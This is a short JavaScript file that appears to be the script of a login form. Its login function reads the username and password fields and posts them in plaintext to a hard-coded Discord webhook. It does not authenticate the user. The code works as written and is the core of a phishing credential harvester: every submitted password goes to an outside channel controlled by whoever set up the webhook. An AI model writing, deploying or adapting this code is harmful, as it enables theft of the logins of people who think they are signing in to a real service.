function login() {
  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;

  // Send login information to Discord webhook
  sendToDiscordWebhook(username, password);
}

function sendToDiscordWebhook(username, password) {
  const webhookUrl = 'https://discordapp.com/api/webhooks/1241371321175375903/iF1wqdCpkHvh908vq-WVU0kRtCLnaR_LaSbfGxIRWpgjTOdE4gt7yAT6IZMZDhWFbCPa';

  // Prepare the data to send to the Discord webhook
  const data = {
    content: `New login attempt:\nUsername: ${username}\nPassword: ${password}`
  };

  // Send the data to the Discord webhook
  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  })
  .then(response => {
    console.log('Login information sent to Discord webhook:', response.status);
  })
  .catch(error => {
    console.error('Error sending login information to Discord webhook:', error);
  });
}